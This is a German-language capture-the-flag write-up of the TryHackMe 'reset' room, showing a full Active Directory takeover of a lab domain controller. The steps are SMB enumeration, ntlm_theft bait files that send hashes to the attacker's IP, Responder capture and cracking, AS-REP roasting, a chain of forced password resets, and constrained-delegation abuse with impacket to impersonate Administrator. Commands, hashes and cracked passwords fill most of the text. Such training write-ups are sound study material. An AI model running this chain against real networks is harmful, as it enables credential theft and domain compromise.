---
title: Writeup THM Room reset
date: 2024-02-01 11:45:00 +0100
categories: [THM, Room]
tags: [crackmapexec, ntlm_theft, responder, john, evil-winrm, impacket_GetNPUser, impacket-getST]
comments: false
---
Intro

Step into the shoes of a red teamer in our simulated hack challenge! 
Navigate a realistic organizational environment with up-to-date defenses. 

Test your penetration skills, bypass security measures, and infiltrate into the system. Will you emerge victorious as you simulate the ultimate organization APT?

Find all the flags!

The VM may take about 5 minutes to completely boot.

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/reset]
└─$ nmap -sC -sV  10.10.105.122  -Pn   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-01 08:45 CET
Nmap scan report for 10.10.105.122
Host is up (0.064s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-01 07:45:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-02-01T07:46:15+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Not valid before: 2024-01-25T21:01:31
|_Not valid after:  2024-07-26T21:01:31
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-01T07:45:35+00:00
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-01T07:45:38
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.75 seconds

```

Tragen wir zuerst die hosts in unsere Hosts Datei ein

![Bild](/assets/Bilder/THM_reset/Pasted%20image%2020240201091156.png){: width="700" height="400" }

Versuchen wir mal Crackmapexec

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/reset]
└─$ crackmapexec smb thm.corp
SMB         thm.corp        445    HAYSTACK         [*] Windows 10.0 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
```

Versuchen wir an user mit "--rid-brute" zu erhalten

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/reset]
└─$ crackmapexec smb thm.corp -u 'guest' -p '' --rid-brute 9999
SMB         thm.corp        445    HAYSTACK         [*] Windows 10.0 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         thm.corp        445    HAYSTACK         [+] thm.corp\guest: 
SMB         thm.corp        445    HAYSTACK         [+] Brute forcing RIDs
SMB         thm.corp        445    HAYSTACK         498: THM\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         500: THM\Administrator (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         501: THM\Guest (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         502: THM\krbtgt (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         512: THM\Domain Admins (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         513: THM\Domain Users (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         514: THM\Domain Guests (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         515: THM\Domain Computers (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         516: THM\Domain Controllers (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         517: THM\Cert Publishers (SidTypeAlias)
SMB         thm.corp        445    HAYSTACK         518: THM\Schema Admins (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         519: THM\Enterprise Admins (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         520: THM\Group Policy Creator Owners (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         521: THM\Read-only Domain Controllers (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         522: THM\Cloneable Domain Controllers (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         525: THM\Protected Users (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         526: THM\Key Admins (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         527: THM\Enterprise Key Admins (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         553: THM\RAS and IAS Servers (SidTypeAlias)
SMB         thm.corp        445    HAYSTACK         571: THM\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         thm.corp        445    HAYSTACK         572: THM\Denied RODC Password Replication Group (SidTypeAlias)
SMB         thm.corp        445    HAYSTACK         1008: THM\HAYSTACK$ (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1109: THM\DnsAdmins (SidTypeAlias)
SMB         thm.corp        445    HAYSTACK         1110: THM\DnsUpdateProxy (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         1111: THM\3091731410SA (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1112: THM\ERNESTO_SILVA (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1113: THM\TRACY_CARVER (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1114: THM\SHAWNA_BRAY (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1115: THM\CECILE_WONG (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1116: THM\CYRUS_WHITEHEAD (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1117: THM\DEANNE_WASHINGTON (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1118: THM\ELLIOT_CHARLES (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1119: THM\MICHEL_ROBINSON (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1120: THM\MITCHELL_SHAW (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1121: THM\FANNY_ALLISON (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1122: THM\JULIANNE_HOWE (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1123: THM\ROSLYN_MATHIS (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1124: THM\DANIEL_CHRISTENSEN (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1125: THM\MARCELINO_BALLARD (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1126: THM\CRUZ_HALL (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1127: THM\HOWARD_PAGE (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1128: THM\STEWART_SANTANA (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1130: THM\LINDSAY_SCHULTZ (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1131: THM\TABATHA_BRITT (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1132: THM\RICO_PEARSON (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1133: THM\DARLA_WINTERS (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1134: THM\ANDY_BLACKWELL (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1135: THM\LILY_ONEILL (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1136: THM\CHERYL_MULLINS (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1137: THM\LETHA_MAYO (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1138: THM\HORACE_BOYLE (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1139: THM\CHRISTINA_MCCORMICK (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1141: THM\3811465497SA (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1142: THM\MORGAN_SELLERS (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1143: THM\MARION_CLAY (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1144: THM\3966486072SA (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1146: THM\TED_JACOBSON (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1147: THM\AUGUSTA_HAMILTON (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1148: THM\TREVOR_MELTON (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1149: THM\LEANN_LONG (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1150: THM\RAQUEL_BENSON (SidTypeUser)
SMB         thm.corp        445    HAYSTACK         1151: THM\AN-173-distlist1 (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         1152: THM\Gu-gerardway-distlist1 (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         1154: THM\CH-ecu-distlist1 (SidTypeGroup)
SMB         thm.corp        445    HAYSTACK         1156: THM\AUTOMATE (SidTypeUser)

```

bevor ich Anfange das Password zu brute-forcen, teste ich welche Laufwerke verfügbar sind

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/reset]
└─$ crackmapexec smb thm.corp -u 'guest' -p '' --shares                                    
SMB         thm.corp        445    HAYSTACK         [*] Windows 10.0 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         thm.corp        445    HAYSTACK         [+] thm.corp\guest: 
SMB         thm.corp        445    HAYSTACK         [+] Enumerated shares
SMB         thm.corp        445    HAYSTACK         Share           Permissions     Remark
SMB         thm.corp        445    HAYSTACK         -----           -----------     ------
SMB         thm.corp        445    HAYSTACK         ADMIN$                          Remote Admin
SMB         thm.corp        445    HAYSTACK         C$                              Default share
SMB         thm.corp        445    HAYSTACK         Data            READ,WRITE      
SMB         thm.corp        445    HAYSTACK         IPC$            READ            Remote IPC
SMB         thm.corp        445    HAYSTACK         NETLOGON                        Logon server share 
SMB         thm.corp        445    HAYSTACK         SYSVOL                          Logon server share 
```

so wie es aussieht habe ich write Rechte auf "Date" Verzeichnis. Schauen wir uns das Verzeichnis mal an


```
┌──(bumble㉿bumble)-[/mnt/backup/THM/reset]
└─$ smbclient -U 'guest' '//thm.corp/Data' -p ''
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Feb  1 13:19:45 2024
  ..                                  D        0  Thu Feb  1 13:19:45 2024
  onboarding                          D        0  Thu Feb  1 13:23:43 2024

                7863807 blocks of size 4096. 3022872 blocks available
smb: \> cd onboarding\
smb: \onboarding\> ls
  .                                   D        0  Thu Feb  1 13:23:43 2024
  ..                                  D        0  Thu Feb  1 13:23:43 2024
  nsttdsfk.sks.pdf                    A  4700896  Mon Jul 17 10:11:53 2023
  oeonsodl.bkh.pdf 
```

Da wir Schreib-Rechte haben versuchen wir ntlm_theft und respond einen hash zubekommen wenn jemand die Datei auf dem Server aufmacht

```
┌──(bumble㉿bumble)-[/mnt/backup/Linux-tools/ntlm_theft]
└─$ python3 ntlm_theft.py -g all -s 10.8.126.227 -f bumble
Created: bumble/bumble.scf (BROWSE TO FOLDER)
Created: bumble/bumble-(url).url (BROWSE TO FOLDER)
Created: bumble/bumble-(icon).url (BROWSE TO FOLDER)
Created: bumble/bumble.lnk (BROWSE TO FOLDER)
Created: bumble/bumble.rtf (OPEN)
Created: bumble/bumble-(stylesheet).xml (OPEN)
Created: bumble/bumble-(fulldocx).xml (OPEN)
Created: bumble/bumble.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: bumble/bumble-(includepicture).docx (OPEN)
Created: bumble/bumble-(remotetemplate).docx (OPEN)
Created: bumble/bumble-(frameset).docx (OPEN)
Created: bumble/bumble-(externalcell).xlsx (OPEN)
Created: bumble/bumble.wax (OPEN)
Created: bumble/bumble.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: bumble/bumble.asx (OPEN)
Created: bumble/bumble.jnlp (OPEN)
Created: bumble/bumble.application (DOWNLOAD AND OPEN)
Created: bumble/bumble.pdf (OPEN AND ALLOW)
Created: bumble/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: bumble/Autorun.inf (BROWSE TO FOLDER)
Created: bumble/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
```

Jetzt noch per smbclient die Daten hochlade

```
smb: \onboarding\> put bumble-(externalcell).xlsx 
putting file bumble-(externalcell).xlsx as \onboarding\bumble-(externalcell).xlsx (10.7 kb/s) (average 10.7 kb/s)
smb: \onboarding\> put bumble-(frameset).docx     
putting file bumble-(frameset).docx as \onboarding\bumble-(frameset).docx (46.9 kb/s) (average 21.0 kb/s)
smb: \onboarding\> put bumble.jnlp 
putting file bumble.jnlp as \onboarding\bumble.jnlp (1.1 kb/s) (average 17.2 kb/s)
smb: \onboarding\> put bumble.lnk  
putting file bumble.lnk as \onboarding\bumble.lnk (10.6 kb/s) (average 16.1 kb/s)
smb: \onboarding\> put bumble.m3u 
putting file bumble.m3u as \onboarding\bumble.m3u (0.2 kb/s) (average 13.7 kb/s)
smb: \onboarding\> put bumble.pdf 
putting file bumble.pdf as \onboarding\bumble.pdf (1.6 kb/s) (average 10.5 kb/s)
smb: \onboarding\> put bumble.rtf 
putting file bumble.rtf as \onboarding\bumble.rtf (0.6 kb/s) (average 9.6 kb/s)
smb: \onboarding\> put bumble.scf 
putting file bumble.scf as \onboarding\bumble.scf (0.5 kb/s) (average 8.8 kb/s)
smb: \onboarding\> put bumble.wax 
putting file bumble.wax as \onboarding\bumble.wax (0.3 kb/s) (average 8.2 kb/s)
smb: \onboarding\> put bumble.asx 
putting file bumble.asx as \onboarding\bumble.asx (0.6 kb/s) (average 7.5 kb/s)
smb: \onboarding\> put bumble.htm 
putting file bumble.htm as \onboarding\bumble.htm (0.4 kb/s) (average 7.0 kb/s)
smb: \onboarding\> 

```

Vorher natürlich den Responder starten 

```
┌──(bumble㉿bumble)-[/mnt/backup/Linux-tools/ntlm_theft]
└─$ sudo responder -I tun0      
[sudo] password for bumble:
```

Jetzt heißt es warten

```
[SMB] NTLMv2-SSP Hash     : AUTOMATE::THM:1f71573419a4eb95:4734B8C4B4FB0D7F082B95647B02F75D:010100000000000000A964C21255DA0154FEE059B60CC89C00000000020008004B0058004D00390001001E00570049004E002D0032003300390032004600560054004D0049004400460004003400570049004E002D0032003300390032004600560054004D004900440046002E004B0058004D0039002E004C004F00430041004C00030014004B0058004D0039002E004C004F00430041004C00050014004B0058004D0039002E004C004F00430041004C000700080000A964C21255DA0106000400020000000800300030000000000000000100000000200000E5E8AED671CB4E3EDEDBEEE47DE6558183313B091B47A8E8E60E8B334D54EF2A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E0038002E003100320036002E003200320037000000000000000000  
```

Ich erhalte einen hash von User "Automate", diesen habe ich vorher auch schon gefunden. Versuchen wir das zu cracken

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/reset]
└─$ john automate_hash.txt --wordlist=/mnt/backup/rockyou.txt 
Created directory: /home/bumble/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Passw0rd1        (AUTOMATE)     
1g 0:00:00:00 DONE (2024-02-01 13:45) 5.555g/s 1274Kp/s 1274Kc/s 1274KC/s asswipe!..170176
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Versuchen wir evil-winrm

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/reset]
└─$ evil-winrm -i thm.corp -u 'automate' -p 'Passw0rd1'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\automate\Documents> cd ..
*Evil-WinRM* PS C:\Users\automate> cd Desktop
*Evil-WinRM* PS C:\Users\automate\Desktop> dir


    Directory: C:\Users\automate\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        6/16/2023   4:35 PM             31 user.txt


*Evil-WinRM* PS C:\Users\automate\Desktop> type user.txt
#######
```


Nachdem wir nun die User-Flag haben versuche ich Administrator zu werden.
Hierfür  versuchen ich erstmal mit bloodhount an die AD-Informationen zu kommen

In Bloodhound sehe folgendes

![[Pasted image 20240201143116.png]]
![Bild](/assets/Bilder/THM_reset/Pasted%20image%2020240201143116.png){: width="700" height="400" }

versuchen wir an die Passwörter zu kommen

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/reset]
└─$ python /mnt/backup/impacket/examples/GetNPUsers.py thm.corp/ -dc-ip 10.10.110.95 -usersfile users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

$krb5asrep$23$ERNESTO_SILVA@THM.CORP:3c8e48496a9fe722d2eece0e80c43fe4$64e3bb3da5bff6d1caf60acdf936b2cf0141ac09c84da4fb632bd73e72343547493da90ac9cb48b4ef3ae72e9a8b002e947902a40ebeda06d70925ae8bbcadc544b028a372504a4182c6e0f1325a26573a00e3d8adaa49ff7f51c4e5eb88801dd8231f547bb3d780ebde891e72e5c3dd9b9c9fea43353d8161a298cc88efb953d117f2cc90bfd64e779142fd68ae17f55b393304167e530ed86337551c17c3b319cb1a6923e693bf8ad5298ee1cbb4bbcf65cb56ff14f3faf40bdfc6fa70727b43c1f88bb446fe0ed7c0d11342bc2636854b33b7a0ec918e6f241b5d3bdb2a58b2706c86
[-] User TRACY_CARVER doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SHAWNA_BRAY doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CECILE_WONG doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CYRUS_WHITEHEAD doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DEANNE_WASHINGTON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ELLIOT_CHARLES doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MICHEL_ROBINSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MITCHELL_SHAW doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FANNY_ALLISON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JULIANNE_HOWE doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ROSLYN_MATHIS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DANIEL_CHRISTENSEN doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MARCELINO_BALLARD doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CRUZ_HALL doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HOWARD_PAGE doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User STEWART_SANTANA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User LINDSAY_SCHULTZ doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$TABATHA_BRITT@THM.CORP:4447e8f0b6af4abbd56cd8b3d0d6fcb3$fbc00e440ff5f7cb780f6e52f398e82e1d58e9634a08e7f08ad3adbaafdf52e11d716ccd81f4953ddb682527d28f32e49534156c9faf88a381a698c8a0c8428a5226d49baafba329f4b11265de3894aead47d0dbb376ec72203187281a5050ee96e6df43fbfa6376fcfa82ad01c4edc6fcfd2b9679f97bc85a49f342f90656ce5d7f9389a5117d6a5a9816eb3dd8d41b96daf5120002949fe6309452235e32206ce614d8f67b0ca7146bf4365dba4bdd713fad1ee16481ca155a28a3f006928150a9ea26ac6dd71d31ceef86b25649e576ee5702ac6164668de4ea0a761e5efd3e6c1811
[-] User RICO_PEARSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DARLA_WINTERS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ANDY_BLACKWELL doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User CHERYL_MULLINS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User LETHA_MAYO doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HORACE_BOYLE doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CHRISTINA_MCCORMICK doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MORGAN_SELLERS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MARION_CLAY doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User TED_JACOBSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User AUGUSTA_HAMILTON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User TREVOR_MELTON doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$LEANN_LONG@THM.CORP:643947b775dd62189f2b40bef2821efe$9bf30810200bd668bf1f505196ac1576a4132cd7707ea4553dfbc9dcacf536d672f56931e3bd12b360267d72b6c31330825356b0de515f438b26cd94b6be68939cfd99f6e6246d8231838d45d2d2f24c650b370dc8aa7ef413f2fd632cee738cac698036fbffa52a12006e20fb7ab5535284ef14da1a4b8aa99dc6ff8a040bd4eff718d3ad0dba0b2e94d260ff3cd30ffd9d2a1cef0ba0d9a0602d2fe17d811a0aab24d2fd90d2ccae8f18e06746e4fb10708f6dccf6be333caa5e2d144e48db183b1f559755c3f2586eb53bec6ce6042704ae45c682f47842aec77485ad8b6fe41d3476
[-] User RAQUEL_BENSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User AUTOMATE doesn't have UF_DONT_REQUIRE_PREAUTH set

```

Versuchen wir das zu cracken


```
┌──(bumble㉿bumble)-[/mnt/backup/THM/reset]
└─$ john pre_auth_hashes.txt --wordlist=/mnt/backup/rockyou.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
marlboro(1985)   ($krb5asrep$23$TABATHA_BRITT@THM.CORP)     
1g 0:00:00:22 DONE (2024-02-01 14:33) 0.04401g/s 631327p/s 1516Kc/s 1516KC/s !!123sabi!!123..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                   
```

tatsächlich ist nur ein hash crackbar

Kleiner Gegencheck 

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/reset]
└─$ crackmapexec smb thm.corp -u 'TABATHA_BRITT' -p 'marlboro(1985)'
SMB         thm.corp        445    HAYSTACK         [*] Windows 10.0 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         thm.corp        445    HAYSTACK         [+] thm.corp\TABATHA_BRITT:marlboro(1985) 
```

Schauen wir uns in Bloodhound an was der User so alles kann

Ich finde einen Weg wie ich Administrator werden kann


![Bild](/assets/Bilder/THM_reset/Pasted%20image%2020240201144240.png){: width="700" height="400" }

User TABATHA_BRITT hat Generic All Rechte über SHAWNA_BRAY -> Step1 

SHAWNA_BRAY kann das Password CRUZ_HALL ändern -> Step2

CURZ_HALL hat GenericWrite Rechte über DARLA_WINTERS -> Step 3

Bei DARLA_WINTERS angekomme haben wir dann Delegete Rechte -> Step4


![Bild](/assets/Bilder/THM_reset/Pasted%20image%2020240201144405.png){: width="700" height="400" }

Versuchen wir unser Glück

Step 1
```┌──(bumble㉿bumble)-[/mnt/backup/THM/reset]
└─$ net rpc password "SHAWNA_BRAY" "newP@ssword2022" -U "DOMAIN"/"TABATHA_BRITT"%"marlboro(1985)" -S "thm.corp"
```

Step 2
```                                                                                                                    
┌──(bumble㉿bumble)-[/mnt/backup/THM/reset]
└─$ net rpc password "CRUZ_HALL" "newP@ssword2022" -U "DOMAIN"/"SHAWNA_BRAY"%"newP@ssword2022" -S "thm.corp"
```

Step 3
```                                                                                                                    
┌──(bumble㉿bumble)-[/mnt/backup/THM/reset]
└─$ net rpc password "DARLA_WINTERS" "newP@ssword2022" -U "DOMAIN"/"CRUZ_HALL"%"newP@ssword2022" -S "thm.corp"
```

Prüfen wir ob es geklappt hat
```                                                                                                                    
┌──(bumble㉿bumble)-[/mnt/backup/THM/reset]
└─$ crackmapexec smb thm.corp -u 'CARLA_WINTERS' -p 'newP@ssword2022'
SMB         thm.corp        445    HAYSTACK         [*] Windows 10.0 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         thm.corp        445    HAYSTACK         [+] thm.corp\CARLA_WINTERS:newP@ssword2022 
```

Step 4 hierfür nutze ich getST.py von impacket

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/reset]
└─$ python3 /mnt/backup/impacket/examples/getST.py -spn "cifs/haystack.thm.corp" -impersonate "Administrator" "thm.corp/DARLA_WINTERS:newP@ssword2022"
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache

```

```
┌──(bumble㉿bumble)-[/mnt/backup/THM/reset]
└─$ export KRB5CCNAME=Administrator.ccache
                                                                                                                                                                                                                                            
┌──(bumble㉿bumble)-[/mnt/backup/THM/reset]
└─$ pythpython3 /mnt/backup/impacket/examples/wmiexec.py -k -no-pass Administrator@haystack.thm.corp
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\

02/01/2024  12:19 PM    <DIR>          Data
11/14/2018  06:56 AM    <DIR>          EFI
05/13/2020  05:58 PM    <DIR>          PerfLogs
11/14/2018  04:10 PM    <DIR>          Program Files
03/11/2021  07:29 AM    <DIR>          Program Files (x86)
08/21/2023  08:33 PM    <DIR>          Users
02/01/2024  02:46 PM    <DIR>          Windows
               0 File(s)              0 bytes
               7 Dir(s)  12,383,649,792 bytes free

C:\>cd Users
C:\Users>cd Administrator\Desktop
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

07/14/2023  07:23 AM    <DIR>          .
07/14/2023  07:23 AM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/16/2023  04:37 PM                30 root.txt
               3 File(s)          1,111 bytes
               2 Dir(s)  12,383,342,592 bytes free

C:\Users\Administrator\Desktop>type root.txt

```

